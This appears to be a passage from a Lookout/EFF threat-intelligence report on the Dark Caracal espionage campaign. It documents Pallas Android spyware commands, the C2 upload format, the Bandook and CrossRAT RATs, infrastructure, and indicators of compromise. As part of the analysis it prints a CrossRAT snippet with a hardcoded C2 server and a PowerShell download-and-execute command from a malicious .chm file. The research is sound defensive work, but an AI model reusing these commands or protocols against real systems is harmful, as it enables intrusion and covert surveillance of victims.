<file_name>\nRecord an MPEG4 audio file (.mp4) for an attacker-specified duration.  \nAudio is captured with the device’s microphone, and once complete is \nuploaded to the C2 server.REC1 ac=REPX\nuid=<Device_ID>\nRP=Microphone Already in use by another app\nPerforms the same functionality as detailed above for the REC1 command with the exception that the file is stored locally on external storage under the path \n.Temp/srecSMS1 ac=REPX\nuid=<Device_ID>\nRP=Microphone Already in use by another app\nSend a text message to an attacker-specified number. SMS1 ac=REPX\nuid=<Device_ID>\nRP=SMS sent to<destinationAddress>\nDisplays an alert with a phishing theme on a compromised device with the intention of stealing the victim’s credentials. Any entered credentials are sent to attacker servers.PWS1 ac=PPWSuid=<Device_ID>PS=<victim’s credentials>\nChecks the Android build on the device as well as the permissions of the app. PRM1\nIf the installed Pallas sample is a trojanized version of Telegram, WhatsApp, Threema, or Primo, then retrieve their databases and, if present, associated keys.WT1\nCreate a zip file of the shared_pref for the installed Pallas app and upload it to C2 infrastructure.SHPR ac=GTMBFTFX=<a string set by C2>\nManipulate Bitmap images, convert to JPG, and upload to C2. SILF\nSame operation as SILF but on a directory of images. SIFO ac=GTMBF\nTFX=<a string set by C2>\nSplit an attacker-specified file into chunks, saving them to  \nexternal storage under the path .Temp/spd/ .SPLT1 ac=REPXuid=<Device_ID>RP=<fileName> Splitted\nCreate a zipfile of the contents of an attacker-specified directory and upload it to a C2 server. ZDIR1  27\nSECURITY RESEARCH REPORTPallas handles the exfiltrated data server-side via the upload.php script. This accepts HTTP POST requests that have the following \nheaders and structure, where op_id specifies the type of file being uploaded.\nWhen Pallas receives the GALL1 instruction, it uploads exfiltrated data as a zip archive or saves it as a .db file. For most .db files, \neach line is base64 encoded and prepended with the string “*#@”. When decoded, each line translates to a piece of exfiltrated \ndata. Each piece of information is associated with a content keyword or data type. This can be represented as follows:\n<DataType><separator>[<field><separator>...<field><separator>]POST\nRequest propertiesConnection : Keep-Alive\nENCTYPE : multipart/form-data\nContent-Type : multipart/form-data;boundary=*****Uploaded_file : <abs_path_file_on_victim_device>\nupload.php?test=<app_id>&op=<op_id>&rn=<>&extra=<>&extra2=<>[&FLS=\n<>&RLD=<>]\n--*****\\r\\n\nContent-Disposition: form-data; name=\\”uploaded_file\\”;filename=\\<abs_path_file_on_victim>\\\\r\\n\n\\r\\n\n<data_from_victim_to_upload>\\r\\n\n--*****--\\r\\n  28\nSECURITY RESEARCH REPORTData Data Type Fields Description\nSMS A0X01 date\naddress\nbody\nidtypeAll SMS fields are set according to the Android SMS content provider \ndocumentation\n14 in which the address \nis the address of the other party and the type may be any of the following \nvalues:\n• “0” : ALL\n• “1”: INBOX\n• “2”: SENT\n• “3”:”DRAFT”\n• “4”:OUTBOX\n• “5”:FAILED\n• “6”: QUEUED\nContacts A0X02 Display_nameData1\nTimes_contacted\nLast_time_contactedAll contacts fields are set according to the Android ContactsContract \ndocumentation\n15.\nCalls A0X03 NumberType\nDateDurationAll contacts fields are set according to \nthe Android documentation for phone \ncalls\n16 in which type is a string with  \nany of the following values:\n• ”INCOMING”\n• ”OUTGOING”\n• “MISSED”\n• ”null”\nDate is in the standard Java SQL DATE format\n17.\nInstalled package A0X04 Application_labelPackage_name\nVersion_name\nVersion_codeSpecifies the list of installed packages on a victim’s device.\nBrowsing History A0X05 Page_titlePage_URLSpecifies the web pages a victim  has visited.Analysis of all known Pallas samples seen to date has resulted in the identification of the following 10 data types: \n14 https://developer.android.com/guide/topics/providers/content-provider-basics.html\n15 https://developer.android.com/reference/android/provider/ContactsContract.CommonDataKinds.Phone.html \n16 https://developer.android.com/reference/android/provider/CallLog.Calls.html \n17 https://docs.oracle.com/javase/7/docs/api/java/sql/Date.html   29\nSECURITY RESEARCH REPORTData Data Type Fields Description\nBookmarks A0X06 Bookmark_Title\nBookmark_URLSpecifies the web pages a victim has bookmarked.\nWiFi A0X07 SSID\nCapabilities\nLevelFrequency\nBSSIDAll the fields are defined in Android scan result documentation\n18.\nAccounts A0X08 Name\nTypeName is the account name of a victim and type is the authenticator name of \nthat account.\nAccess Logs MIAMO App_name\nApp_pathString1Specifies a “.db” file that contains File and Directory access logs of a trojanized app. The “MIAMO” \ninformation line is always the first line \nin such files. App_path is always a path that a Pallas sample has access \nto, for example, the SDCard or the \napplication’s data folder.String1 is either set to “NO” or an \nabsolute path.\nAccess Logs D Directory_path\nDirectory_nameDirectories that the app has accessed. Only exists in a file with “MIAMO” as the first line.\nAccess Logs F File_path\nFile_name\nFile_lengthLasModifiedTimeFiles that the app has accessed.  \nOnly exists in a file with “MIAMO” \n as the first line.(continued from page 28)\n18 https://developer.android.com/reference/android/net/wifi/ScanResult.html   30\nSECURITY RESEARCH REPORTTitle: Android Update\nPackage Name: com.esn.walSHA1: 835befd9376f90a12892876b482c1dcc39643a09\nMD5: d965c3736e530bfdbfde2cc6a264f2aa\nRequestID : 0 C2 Phone Added : +7820435193\nMobileTargetUID : 0 VoicePhone Added : +7820944266\nVersion : 0 VoicePhone Added : +78235424312\nMobileTargetID : nana Logging : 0\nHeartBeatInterval : 120 C2 : 180.235.133.57\nTrojanID : nana Ports: 21, 53, 443, 4111\nTrojanUID : 03FDAF68 Included exploits - Exynos Abuse\nUserID : 1000 Installed Modules\n• SMS\n• Phone log collection\n• Call recording\n• Device trackingMaxInfections : 30\nRemovalAtDate : 0RemovalIfNoProxy : 0Previous Use of FinFisher Spyware\nIn addition to the Pallas samples, we discovered a previously unreported FinFisher sample19 on the tweetsfb[.]com server.\nIt is unclear whether this sample was a demo provided to this actor or if the actor came across it via other means.  \nThe date of package and compilation for this sample is 2014-03-27 17:26:14 UTC. \nBelow is the extracted configuration and relevant details of this sample.\n19 https://en.wikipedia.org/wiki/FinFisher  31\nSECURITY RESEARCH REPORTSurveillanceware - Desktop Components\nThe desktop malware component exists in a range of file types, including executables, zip archives, PDFs, and Microsoft’s \ncomposite document file format. No zero days or publicly known exploits were located in these files and, based on several of \nthe documents, the primary attack vector is believed to be social engineering via spear-phishing. Analysis into Dark Caracal’s \ndesktop tooling did result in the discovery of a new cross-platform Java RAT known as CrossRAT and confirmed that this actor  \nis using new variants of the Bandook family.\nBandook \nThe Bandook RAT was originally identified during EFF’s Operation Manul research, however, this investigation surfaced new \nvariants belonging to this family. Written in Delphi and targeting Windows operating systems, Bandook samples are packed at \nmultiple stages in order to both evade detection and slow down the process of reverse engineering by security analysts. At the \ntime of writing, 19 out of 63 antivirus engines on the malware repository VirusTotal flagged most Bandook samples as malicious.\nFirst stage samples of the version of Bandook used by Dark Caracal include what appears to be a drawing program and a \ntrojanized version of the Psiphon circumvention software20. While the drawing application was not fully functional and did not \nprovide a user interface when launched, the modified version of Psiphon contained the complete legitimate functionality of the \noriginal application.\nThe first stage malware is signed with a valid SSL certificate issued by Certum CA for Ale Couperus (alecouperus@mail[.]com).  \nWe have identified several distinct samples signed with this certificate. This suggests that the actors behind these samples \ncontrol the private key for this certificate and have the ability to sign arbitrary packages. It is unclear at this time whether the \nprivate key associated with this certificate has been stolen or if the attackers obtained it via legitimate sources. \nUpon initial execution, the first stage of Bandook decrypts several strings that are stored in the data section and base64 \nencoded. Below is the plaintext of some of these strings, which we can see as Windows API calls.\n20 SHA256 hash: ed25b0c20b1c1b271a511a1266fe3967ab851aaa9f793bdf4f3d19de1dcf6532  32\nSECURITY RESEARCH REPORTThe malware uses these API calls to decrypt Bandook’s second stage, an embedded resource. This resource is a randomly \nnamed eight-character string of uppercase letters and numbers. During our research, we only observed the numbers two and \nthree being used and these were often positioned towards the end of the string. Following the decryption of the second stage, \nthe iexplore.exe binary is started and immediately replaced with the loaded resource. This is a technique known as “process \nhollowing21”. \nThe second stage Bandook samples are occasionally packed with the following modified UPX packer “UPX Modified >> *$igBy Ahmed18”. Not all second stages were packed indicating that the authors may be actively developing the malware. As expected, \nthe core malicious functionality resides in the second stage, which attempts to implant itself in the system and contact command \nand control infrastructure for further instructions. At this point, the malware has the ability to start new processes, manipulate the \nfile system and registry, take screen captures, escalate privileges, create mutexes, get system information, execute commands, \nget window names, and beacon to infrastructure. \n21 https://attack.mitre.org/wiki/Technique/T1093 \nFigure 25: Decoded strings from the Bandook sample  33\nSECURITY RESEARCH REPORTBandook communication with attacker infrastructure takes place over a TCP port with HTTP payloads Base64 encoded and \nsuffixed with the string “&&&”. The following is an example of a decoded communication from an infected system:\nInstructions sent from Dark Caracal infrastructure to Bandook compromised systems make use of “~!” as a delimiter, the  \nsame approach used by the Pallas Android malware. This suggests there is a possibility Bandook and Pallas were written by \nthe same author or that the author of one was inspired by the authors of the other. We found Bandook supports the following  \nset of commands.\nFrom this, we can infer some additional functionality, including the ability to view the victim’s webcam, record sound, get Wi-Fi \nconnections, manipulate USB devices, manipulate the Chrome browser, sign the victim out of Skype, search for files, upload new \nfiles to the device, execute secondary infections, or participate in a DDOS attack. \nSystems infected with this Bandook variant contain a copy of the first stage in the path C:\\Users\\user\\AppData\\\nRoaming\\%appname%\\%appname%.exe. Similarly, in such cases, autostart registry keys are written with the same name as the \ndropped file to HKEY_USERS\\Software\\Microsoft\\Windows\\CurrentVersion\\Run. @0000~!18128~!192.168.1.82~!610930~!EFFuser~!Seven~!0d 0h \n3m~!0~!4.1~!21/04/2017~!0~!0~!0~!0~!~!0~!0--~!None~!0~!\nCaptureScreen DeleteFileFromDevice DeleteAutoFTPFromDB\nInit CopyMTP ExecuteTV\nClearCred ChromeInject ExecuteAMMY\nGetCamlist DisableChrome DDOSON\nSendCam RarFolder ExecuteTVNew\nStopCam SendUSBList getkey\nUninstall SignoutSkype SendMTPList\nCompressArchive StealUSB SendMTPList2\nGenerateReports StartFileMonitor GrabFileFromDevice\nGetWifi SendFileMonLog PutFileOnDevice\nStartShell GetUSBMONLIST StopFileMonitor\nGetSound GetFileMONLIST SendinfoList\nSplitMyFile StopUSBMonitor EnableAndLoadCapList\nGetAutoFTP SearchMain DisableMouseCapture\nSendStartup StopSearch AddAutoFTPToDB  34\nSECURITY RESEARCH REPORTCrossRAT\nWhile investigating the axroot[.]com domain, we discovered a new remote access trojan called CrossRAT that we believe was \ndeveloped by, or for, Dark Caracal. Written in Java with the ability to target Windows, Linux, and OSX, CrossRAT is able to \nmanipulate the file system, take screenshots, run arbitrary DLLs for secondary infection on Windows, and gain persistence on  \nthe infected system. \nWhen executed in a Windows environment, CrossRAT attempts to copy itself to %AppData%\\Local\\ Temp\\mediamgrs.jar before, \nlike Bandook, creating an auto-start registry key in HKEY_USERS\\Software\\Microsoft\\Windows\\CurrentVersion\\Run with the \nname “mediamgrs”. \nOn OSX and Linux, it attempts to write a copy of itself to /usr/var/mediamgrs.jar. If CrossRAT does not have sufficient permissions \nto write to this directory, it will fail back to the following path under the user’s home directory: $HOME/Library/mediamgrs.jar.  \nFor CrossRAT installations on OSX, a Launch Agent is created under $HOME/Library/ LaunchAgents/mediamgrs.plist to ensure that it will be launched again when the computer restarts. When on Linux, this persistence is achieved by writing an autorun file  \nto $HOME/.config/autostart/mediamgrs.desktop.\nCrossRAT performs communications to its C2 infrastructure via a TCP socket. The following is an example of content sent over  \nthe wire from a compromised machine:\nCrossRAT uses a similar structure to Pallas and Bandook when communicating with infrastructure. Specifically, it uses &&& to \nterminate the response string and uses @### to start command strings.\nBelow is a code snippet from a CrossRAT sample. The response prefixes, hard coded C2 server of flexberry[.]com, and fixed  \nport of 2223, are clearly visible. 5287249f-caa2-4b66-850c-49eedd46cf47$#@@0000$#@192.168.1.16$#@Windows \n7$#@6.1$#@EFFuser^585948$#@0.1$#@GROUP2$#@&&&\npublic final class k\n{\n    public static boolean a = false;\n    // Hardcoded C2 Information\n    public static String b = “flexberry.com”; // C2 Server\n    public static int c = 2223; // C2 Port  35\nSECURITY RESEARCH REPORT    public static String d = “$#@”; // Argument delimiter\n    public static String e = “^!@”; // delimiter within arguments \n    public static UUID f;\n    public static String g;    public static Preferences h;\n    public static String i = “0.1”; // Version Number\n    public static String j = “GROUP2”; // Campaign name     public static Socket k;\n    public static Socket l;\n    // Server command prefixes \n    public static String m = “@0000”; // Enumerate root directories on the system. 0 args\n    public static String n = “@0001”; // Enumerate files on the system. 1 arg    public static String o = “@0002”; // Create blank file on system. 1 arg\n    public static String p = “@0003”; // Copy File. 2 args\n    public static String q = “@0004”; // Move file. 2 args    public static String r = “@0005”; // Write file contents. 4 args \n    public static String s = “@0006”; // Read file contents. 4 args\n    public static String t = “@0007”; // Heartbeat request. 0 args    public static String u = “@0008”; // Get screenshot. 0 args\n    public static String v = “@0009”; // Run a DLL (windows only). 1 arg\n    // Client response prefixes \n    public static String w = “@0000”; // client hello\n    public static String x = “@0001”; // heartbeat response    public static String y = “@0002”; // List of system root directories \n    public static String z = “@0003”; // Status message for file manager connect, unimplemented\n    public static String A = “@0004”; // Status message for file manager connect, unimplemented    public static String B = “@0005”; // List of files on system\n    public static String C = “@0006”; // End list of files on system\n    public static String D = “@0007”; // file created status message    public static String E = “@0008”; // file written status message\n    public static String F = “@0009”; // file moved status message\n    public static String G = “@0010”; // file write status    public static String H = “@0011”; // file read status and file contents\n    public static String I = “@0012”; // send screenshot contents\n    public static String J = “@0013”; // Run DLL status message    public static String K; // Filepath for CrossRAT(continued from page 34)\nAnalysis of CrossRAT shows that it has a version number of 0.1, which indicates that its malicious capabilities are still under \ndevelopment. Implemented functionality includes the ability to enumerate attacker-specified directories, copy / move / read  \nfiles, beacon to C2 infrastructure, run attacker specific libraries (Windows only), and create empty files. The CrossRAT sample  \nwe discovered was last modified in March of 2017.  36\nSECURITY RESEARCH REPORTvar v = app.viewerVers, ion;\nif (v < 7) {\n    var n = 0;\n    if (this.dataObjects != null) n = this.dataObjects.length;    if (v >= 5 && v < 6 && n > 0 && (app.viewerVariation == “Full” || app.viewerVariation == \n“Fill-In”)) {\n        if (this.external\\) app.alert(“This document has file attachments. To view the attachments, click the Save button to save a copy of the document, open the copy in Acrobat, \nand use the File > Document Properties > Embedded Data Objects menu.”, 3, 0);\n        else app.\\alert(“This document has file attachments. Use the File > Document Properties > Embedded Data Objects menu to view the attachments.”, 3, 0);\n    } else if (v >= 6 && v < 7) {\n        if (n == 0) {            var np = this.numPages;\n            syncAnnotScan();\\\n            for (var p = 0; p < np && n == 0; ++p) {                var annots = this.getAnnots(p);\n                if (annots != null) {\n                    for (var i = 0; i < annots.length; ++i) {                        if (annots[i].type == “FileAttachment”) {\n                            n = 1;\\\n                            break;                        }\n                    }\n                }            }\n        }\n        if (n > 0) {            if (this.external) app.alert(“This document has file attachments. To view the \nattachments, click the black triangle at the top of the document window’s vertical scrollbar \nand \\choose File Attachments.”, 3, 0);\n            else app.alert(“This document has file attachments. Use the Document > File \nAttachments menu to view the attachments.”, 3, 0);        }\n    }\n}\n--- \nthis.exportDataObject({ cName: “BL920123.doc”, nLaunch: 2 });Infected Documents\nWe identified several Word documents which appear to be intended for use as infection vectors in phishing attacks. \nNone of the documents appear to contain any exploits, but rather rely on macros to run malicious code on a target \nsystem. If executed in an environment that has macros enabled, the malware downloads its second stage components. \nWe saw this same process in numerous malicious PDF files that used javascript to download secondary stages. The \nfollowing script is an example of this functionality, which is identical to the malicious Word doc with the SHA256 hash \ne5eeb0a46dac58b171ebcefec60e9ff351fc7279d95892c6f48f799a1a364215 (Word macro fixed.doc).   37\nSECURITY RESEARCH REPORTOther Samples\nSurprisingly, we also observed a malicious Microsoft Compiled HTML Help file with the .chm extension. Primarily used for \nsoftware documentation, .chm files were first introduced with the release of Window 98. However, they are still supported in \nWindows 7. The chm file attempts to execute a command via Powershell that downloads an additional file called ne.abc from  \nthe server cma-cgrm[.]com. Below is the command contained in the malicious .chm file. \nAt the time of analysis, this server was no longer live and, as such, the associated ne.abc binary has not yet been acquired and \ndoes not appear on VirusTotal. The cma-cgrm[.]com domain is not obviously connected with other infrastructure.Figure 26: An observed malicious Word file that, when executed, attempts to run macros in order to download \nand execute Bandook stage one\ncmd.exe,/c powershell.exe -ExecutionPolicy bypass -noprofile \n-WindowStyle Hidden (New-Object  \nSystem.Net.WebClient).DownloadFile(‘https://cma-     \ncgrm[.]com/ebusiness/ne.abc’,’%TEMP%\\chmplg.exe’);Start-Process \n%TEMP%\\chmplg.exe;  38\nSECURITY RESEARCH REPORTInfrastructure\nWhile analyzing adobeair[.]net, we uncovered sprawling infrastructure used by Dark Caracal. This infrastructure serves a broad \nset of purposes, including acting as storage for exfiltrated data, masquerading as an Android App Store hosting malware, \ndelivering attacker commands to infected devices, and providing phishing content aimed at gathering credentials for various  \nwell known services. \nWe found much of this infrastructure hosted on servers provided by Shinjiru, an offshore bulletproof hosting provider that allows \nits customers to host almost any content. WHOIS information listed for the adobeair[.]net C2 server led to the discovery of many \nof these domains, as did scanning of Shinjiru IP blocks for servers running a set of services. This acted as a fingerprint for Dark \nCaracal’s infrastructure. To date, the following domains and IPs have been identified as connected to the infrastructure used  \nby Dark Caracal. \nDomain Links / Connection to Dark Caracal\nadobeair[.]net Shared C2 server / Exfiltrated data server\nsecureandroid[.]info Blackmarket “Android App Store” \ntweetsfb[.]com Watering hole, Facebook groups, used to phish credentials, running Apache Win32 \nfbarticles[.]com Phishing domain linked by WHOIS (op13)\nArablivenews[.]com [EXPIRED] WHOIS (op13)\nNancyrazzouk[.]com [EXPIRED] WHOIS (nancyrazzouk)\nArabpublisherslb[.]com WHOIS (nancyrazzouk)\nflexberry[.]com 94[.]229[.]70[.]7 (Windows)\nplanethdx[.]com 94[.]229[.]70[.]7 (Windows)\nglobalmic[.]net 94[.]229[.]70[.]7 (Windows)\nmegadeb[.]com 94[.]229[.]70[.]7 (Windows)\nopwalls[.]com 94[.]229[.]70[.]7 (Windows)\nmecodata[.]com 94[.]229[.]70[.]7 (Windows)\nsabisint[.]com 94[.]229[.]70[.]7 (Windows)\nroxsoft[.]net 94[.]229[.]70[.]7 (Windows)\naxroot[.]com Windows malware campaign\nskypeupdate[.]com Windows malware campaign\nplayermea[.]com Windows malware campaign\nkaliex[.]net Windows malware campaign\ntenoclock[.]net Windows malware campaign\nancmax[.]com Windows malware campaign  39\nSECURITY RESEARCH REPORTThe following relevant contact information has also been identified during this investigation. \nPrimary Command and Control Server\nAs noted, adobeair[.]net is hosted on Shinjiru. This bulletproof hosting company allows its customers to host almost any type of \ncontent, protects client identity, accepts Bitcoin for payment, and is more resilient than other providers to takedowns22. Shinjiru \nhas also been used to host many of the Dark Caracal Windows domains dating back over seven years to April 27th, 2010 \n(see a list of Windows malware domains in the Windows infrastructure section below).\nAt the time of writing, adobeair[.]net is currently live and running a fairly unique set of services. We have used this server as a \nfingerprint in the discovery of further related infrastructure. These services include XAMPP for Windows 5.6.31, Apache 2.4.26, \nMariaDB 10.1.25, PHP 5.6.31, phpMyAdmin 4.7.0, and OpenSSL 1.0.2. We confirmed these via an nmap scan of the adobeair server.23 Email Link/Context\nop13@mail[.]com Primary email contact for C2 server. Associated with “rami jabbour” “Hadi Maz\nnancyrazzouk@mail[.]com nancyrazzouk\nhicham.dika@mail[.]com SSL cert in exe\nhetemramadani5@gmail.com SSL cert in exe\nalecouperus@mail.com SSL cert in exe\n22 https://www.shinjiru.com/company/about-us/\n23 https://www.apachefriends.org/download.htmlFigure 27: Nmap scan of adobeair[.]net  40\nSECURITY RESEARCH REPORTThe adobeair[.]net C2 server had the Apache mod_status module enabled. This provides operators with information on server \nactivity, performance, and a statistics page under /server-status that details connected clients and the server resources they are \naccessing. By programmatically monitoring this page, we were able to determine the source IPs of infected clients and admins \nlogging into the console.\nThe adobeair[.]net server has, as of late September 2017, been moved to a new hosting provider, M247, and the operators have \nimproved the security. \nWHOIS history for adobeair[.]net lists Nancy Razzouk with an email address of op13@mail[.]com as the registrant. We have identified \nthe “Nancy Razzouk” persona as the SSL signer of the Windows malware samples and the registrant of multiple domains. Its reuse \nhas helped identify further Dark Caracal infrastructure.\nFigure 28: WHOIS information for adodeair[.]net as observed in August 2017  41\nSECURITY RESEARCH REPORTWatering Hole Server\nDuring this investigation, we determined this server is the only infrastructure we discovered that serves up malicious apps \nbelonging to the Pallas malware family. A detailed analysis of these applications can be found under the Android Surveillanceware \nsection. As with other Dark Caracal infrastructure, the secureandroid[.]info domain was also registered with the bulletproof hosting \ncompany Shinjiru.\nWe found links to these landing pages in the exfiltrated content of compromised devices, which indicates it is actively being used \nduring the attack chain. As of December 2017 it appears that secureandroid[.]info has had its domain expire.\nPhishing Domains\nWe identified the Dark Caracal domain tweetsfb[.]com while analyzing the secureandroid[.]info server source code. We identified two bit[.]ly URLs on this server that resolve to other pages on the tweetsfb site that were carefully crafted to look like the Facebook \nand Twitter login portals. The copyright dates suggest these pages are clones of the originals from 2015. \n \nFigure 29: Screenshot of the secureandroid[.]info watering hole server, a \ndistribution point for Pallas\nFigure 30: Dark Caracal clones of Twitter and Facebook login portals  42\nSECURITY RESEARCH REPORTThese bit[.]ly links and their respective resolving links are:\n• http://bit[.]ly/2j3r285 points to  \nhttp://www.tweetsfb[.]com/services/100001472583690/twitter/articles/100001/\n• http://bit[.]ly/2iByHcu points to  \nhttp://tweetsfb[.]com/services/100001472583690/facebook/groups/100002/\nThe tweetsfb[.]com domain was found to share an IP address (172.94.17.147) with the following additional domains.\nWe were able to find additional phishing campaigns in VirusTotal that referenced fbarticles[.]com. While fbarticles was registered \nby the op13@mail[.]com address with the name “Hadi Mazeh,” the WHOIS information for fbtweets was private.\nFigure 31: Domains sharing the same IP address as tweetsfb[.]com\nFigure 32: Detections in VirusTotal for fbarticles[.]com  43\nSECURITY RESEARCH REPORTNote: we identified three further domains — “facebookservices[.]org”, “gmailservices[.]org”, and “twiterservices[.]org” that were \nonce a part of this campaign. Those domains now appear to be sinkholed.\nWhen we discovered these domains, the threat actors had already taken them offline and another individual had purchased \nthem. This individual is associated with unrelated domains that are connected to other APT reports. However, we noticed that \nthe individual purchased the domains after the APT reports went public. While we’re not sure why this individual is purchasing, \nsinkholing, and monitoring these domains, we think it’s an interesting note. \nFigure 33: Detections in VirusTotal for the IP address that hosted fbarticles[.]com  44\nSECURITY RESEARCH REPORTWindows C2 Servers \nThe Windows server infrastructure has a much longer history than the Android infrastructure, showing that the actors are willing \nto evolve to new technologies, such as mobile, as they become more valuable targets. \nThe Windows malware servers hosted control panels for multiple campaigns using various malware that included IRIS \nRAT, Bandook, and Arcom RAT. We found these servers hosting exfiltrated desktop content, Windows malware signed by \n“alecouperus@mail[.]com”, and the CrossRAT trojan.\nAll of these domains share the same IP on more than one occasion and have migrated between hosting providers in the same \ntime window. Most of these domains were hosted on Shinjiru, the same hosting server for the Android campaign.\nThe following screenshot shows HTTP 200 OK response codes for http://<server>/<Payload>/\nEach of the following directories contained a login panel for either IRIS RAT or Arcom RAT.ancmax[.]com\nplanethdx[.]com\nmecodata[.]com\nglobalmic[.]netkaliex[.]net\naxroot[.]comsabisint[.]com\nmegadeb[.]com\nroxsoft[.]net\nflexberry[.]comopwalls[.]com\nFigure 34: Various RAT login portals found on a mix of the C2 servers  45\nSECURITY RESEARCH REPORTUsing the Wayback Machine we identified the signature Win32 apache server running on skypeupdate[.]com in 2016. This server \nwas first seen resolving to an IP belonging to Shinjiru in late 2013 and last seen resolving to a Shinjiru IP in late 2016.\nThe oldest domain we identified as part of this infrastructure is flexberry[.]com. The following screenshot shows passive DNS \nresolution dating back to 2010.\nFigure 35: Passive DNS resolutions for the infrastructure  46\nSECURITY RESEARCH REPORTAppendix\nIndicators of Compromise and Actor Tracking\nIOC\nEmail\nop13@mail[.]comhicham.dika@mail[.]comnancyrazzouk@mail[.]comalecouperus@mail[.]comhetemramadani5@gmail.cominfo@secureandroid[.]infoIP111.90.141[.]70111.90.145[.]64111.90.141[.]38111.90.158.121111.90.141.169111.90.145.64111.90.150.221180.235.133.57172.111.250.15677.78.103.4174.208.167[.]252111.90.140 [.]11111.90.150[.]221Phone Number+7820435193+7820944266+7820944266\nDomainadobeair[.]net\ntweetsfb[.]comsecureandroid[.]infofbtweets[.]netgsec[.]inarabpublisherslb[.]comsabisint[.]comfbarticles[.]complanethdx[.]comopwalls[.]comkaliex[.]netaxroot[.]commegadeb[.]commecodata[.]comroxsoft[.]netflexberry[.]com\nglobalmic[.]net\nplayermea[.]com  47\nSECURITY RESEARCH REPORT(continued from page 46)\narablivenews[.]com\necowatchasia[.]com\netn9[.]com\nancmax[.]com\ntenoclock[.]net\nkaliex[.]net\nmangoco[.]net\njaysonj.no-ip[.]bizorange2015[.]netskypeservice.no-ip[.]orgaccountslogin[.]servicesadobeinstall[.]com\nadobe-flashviewer.accountslogin[.]services\ndropboxonline[.]com\niceteapeach[.]com\nnvidiaupdate[.]com\nskypeupdate[.]com\npaktest.ddns[.]netwatermelon2017[.]com\nIOC Type PackageName\nb0151434815f8b3796ab83848bf6969a2b2ad721 SHA1 com.primo.mobile.android.app\nbfbe5218a1b4f8c55eadf2583a2655a49bf6a884 SHA1 org.thoughtcrime.securesms\n47243997992d253f7c4ea20f846191697999cd57 SHA1 com.psiphon3\ned4754effda466b8babf87bcba2717760f112455 SHA1 com.gbwhatsapp\n309038fceb9a5eb6af83bd9c3ed28bf4487dc27d SHA1 org.telegram.plus\neaed6ce848e68d5ec42837640eb21d3bfd9ae692 SHA1 org.torproject.android\nedf037efc400ccb9f843500103a208fe1f254453 SHA1 org.telegram.plus\n35b70d89af691ac244a547842b7c8dfd9a7233fe SHA1 ch.threema.app\n7d47da505f8d3ee153629b373f6792c8858f76e8 SHA1 com.flashplayer.player\n4896b0c957b6a985b2b6efe2ffe517dceaa6ce01 SHA1 com.flashplayer.player\n6a2d5c0a4cc5b5053f5c8f15c447316fae66b57b SHA1 com.flashplayer.playerMobile Implant Apps  48\nSECURITY RESEARCH REPORTDesktop Implant Apps\nSHA2 Sum File Type\nce583821191345274cd954b2db7da9742c239fe413fc17dcb97ffdd7b51cb072 MS Windows HtmlHelp Data\nba4e063472a2559b4baa82d5272304a1cdae6968145c5ef221295c90e88458e2 PE32 executable (DLL) (GUI) Intel 80386\n26419a0b6e033cdcb7bf4ca6b0b24fda35490cc6f2796682fb9403620f63d428 PE32 executable (GUI) Intel 80386\n15af5bbf3c8d5e5db41fd7c3d722e8b247b40f2da747d5c334f7fd80b715a649 Zip archive data\n22eee43887e94997f9f9786092ffd3a9b51f059924cba678cf7b62cfafa65b28 PE32 executable (GUI) Intel 80386\nfcf8f9566868d65d901fd6db9a8d6decacb860f5595f84a6a878193eda11549d PDF document, version 1.6\nf2178146741f91923c7d3e2442bd08605ed5a0927736e8cfdea00c055b2c6284 PDF document, version 1.6\n6b6d363d653785f420dcc1a23c9d9b8b76b8647209b52562b774c793dc0e3f6b data\na3ae05a134b30b8c8869d0acd65ed5bca160988b404c146a325f2399b9c1a243 PE32 executable (DLL) (GUI) Intel 80386\ne5eeb0a46dac58b171ebcefec60e9ff351fc7279d95892c6f48f799a1a364215 Composite Document File V2 Document\n400bca713ba1def9cdbc0e84fc97447db2fa3d12b1c5ef352ef985b7787b6ca4 Microsoft Word 2007+\n5e0d061531071e53b3b993e06ce20dae6389a7e9eba5d7887399de48e2f2d278 Composite Document File V2 \nf9f2e632535b214a0fab376b32cbee1cab6507490c22ba9e12cfa417ed8d72bb MS-DOS executable\nbf600e7b27bdd9e396e5c396aba7f079c244bfb92ee45c721c2294aa36586206 PE32 executable (GUI)\nda81aec00b563123d2fbd14fb6a76619c90f81e83c5bd8aa0676922cae96b9ad PE32 executable (GUI) Intel 80386\n9cf3d3c0b790cebeacb8cb577cd346a6513b1b74fa120aff8984aa022301562e PE32 executable (DLL) (GUI) Intel 80386\n091ae8d5649c4e040d25550f2cdf7f1ddfc9c698e672318eb1ab6303aa1cf85b PE32 executable (GUI) Intel 80386\na91c2cad20935a85d6eed72ef663254396914811f043018732d29276424a9578 PE32 executable (GUI) Intel 80386\nb6ac374f79860ae99736aaa190cce5922a969ab060d7ae367dbfa094bfe4777d PE32 executable (GUI) Intel 80386\ned97719c008422925ae21ff34448a8c35ee270a428b0478e24669396761d0790 PE32 executable (GUI) Intel 80386\n5c1622cabf21672a8a5379ce8d0ee0ba6d5bc137657f3779faa694fcc4bb3988 PE32 executable (GUI) Intel 80386\n86f1bbda3ebf03a0f0a79d7bd1db68598ace9465f5cebb7f66773f8a818b4e8b PE32 executable (DLL) (GUI) Intel 80386\n675c3d96070dc9a0e437f3e1b653b90dbc6700b0ec57379d4139e65f7d2799cd PE32 executable (DLL) (GUI) Intel 80386\ned25b0c20b1c1b271a511a1266fe3967ab851aaa9f793bdf4f3d19de1dcf6532 PE32 executable (GUI) Intel 80386\nf581a75a0f8f8eb200a283437bed48f30ae9d5616e94f64acfd93c12fcef987a PE32 executable (GUI) Intel 80386\nd57701321f2f13585a02fc8ba6cbf1f2f094764bfa067eb73c0101060289b0ba PE32 executable (GUI) Intel 80386SECURITY RESEARCH REPORT  49\n1-888-988-5795   |   lookout.com  \n© 2018 Lookout, Inc. LOOKOUT®, the Lookout Shield Design®, LOOKOUT with Shield Design®, SCREAM®, and SIGNAL FLARE® are registered trademarks of Lookout, Inc. \nin the United States and other countries. EVERYTHING IS OK®, LOOKOUT MOBILE SECURITY®, and PROTECTED BY LOOKOUT®, are registered trademarks of Lookout, \nInc. in the United States. POWERED BY LOOKOUT™ is a trademark of Lookout, Inc. All other brand and product names are trademarks or registered trademarks of their \nrespective holders. 20180118-Lookout-USv1.0Lookout Website\nwww.lookout.com\nBlog\nblog.lookout.com  \nEmail\nthreatintel@lookout.com\nTwitter\n@lookout \nEFF Website\nwww.eff.org\nBlog\nwww.eff.org/deeplinks\nEmail\npress@eff.org\nTwitter\n@eff About Lookout\nLookout is a cybersecurity company for a world run by apps. \nPowered by the largest dataset of mobile code in existence, \nLookout is the security platform of record for mobile device \nintegrity and data access. Lookout is trusted by hundreds \nof millions of individuals, hundreds of 